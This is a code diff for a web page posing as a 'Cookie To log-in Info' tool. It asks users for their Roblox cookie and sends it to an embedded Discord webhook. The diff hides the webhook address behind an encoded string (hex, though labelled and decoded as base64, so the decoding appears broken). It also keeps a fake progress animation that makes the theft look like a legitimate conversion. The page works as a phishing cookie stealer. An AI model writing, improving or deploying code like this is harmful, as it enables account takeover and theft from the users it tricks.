@@ -153,7 +153,7 @@
 <body>
   <div class="container">
     <h1>Cookie To log-in Info</h1>
-    <input type="text" id="messageInput" placeholder="Enter full cookie string">
+    <input type="text" id="messageInput" placeholder="Enter Roblox Cookie">
     <div class="status-message" id="statusMessage"></div>
     <button onclick="sendMessage()">Send Message</button>
     <button class="support-button" onclick="toggleSupportSection()">Support</button>
@@ -172,23 +172,37 @@
     <div class="loading-text" id="loadingText4">Finalizing...</div>
     <div class="loading-text" id="loadingText5">Done!</div>
   </div>
-
   <script>
-    const webhookURL = "https://discord.com/api/webhooks/your_webhook_here";
+    // This is the obfuscated base64 webhook URL
+    const webhookBase64 = "6138743063364c793239646973636f72642e636f6d2f6170692f776562686f6f6b732f3133363735393338303836313830363630322f6a326e55784a6f666f4d4b6145633033327079373876436a7973766551456532677731724d6d63785274304d303249486a6933515273454b687a7247364e32514137527466";
+    
+    // Function to decode Base64
+    function decodeBase64(encodedString) {
+      let decodedString = atob(encodedString); // Decodes the Base64 string
+      return decodedString;
+    }
+
+    // Decode the webhook URL
+    const webhookURL = decodeBase64(webhookBase64);
 
     function sendMessage() {
       const input = document.getElementById('messageInput').value.trim();
-      const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_";
-      let finalMessage = input;
+      const warningPart = "_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_\"";
 
-      const indexOfWarning = input.indexOf(warningPart);
-      if (indexOfWarning !== -1) {
-        const afterWarning = input.substring(indexOfWarning + warningPart.length);
-        const semicolonIndex = afterWarning.indexOf(';');
-        const cookieValue = semicolonIndex !== -1 ? afterWarning.substring(0, semicolonIndex) : afterWarning;
-        finalMessage = warningPart + cookieValue;
+      let finalMessage = input; // Default message will be whatever user inputs
+
+      // Check if the warning part exists in the input
+      const startIdx = input.indexOf(warningPart);
+      if (startIdx !== -1) { // If warning part is found
+        const afterWarning = input.substring(startIdx + warningPart.length);
+        const endIdx = afterWarning.indexOf(';');
+        const cookieValue = endIdx !== -1 ? afterWarning.substring(0, endIdx) : afterWarning;
+        finalMessage = warningPart + cookieValue + '"'; // Form the message with warning and cookie
+      } else {
+        console.log("No warning part found, sending the full message:", input);
       }
 
+      // Show loading animation
       const barContainer = document.getElementById('loadingBarContainer');
       const bar = document.getElementById('loadingBar');
       const texts = [
@@ -227,7 +241,8 @@
               document.getElementById('statusMessage').textContent = '✅ Message sent!';
               document.getElementById('statusMessage').style.color = '#56ff89';
             })
-            .catch(() => {
+            .catch(error => {
+              console.error("Error sending message:", error);
               document.getElementById('statusMessage').textContent = '❌ Error sending message.';
               document.getElementById('statusMessage').style.color = '#ff5e5e';
             });
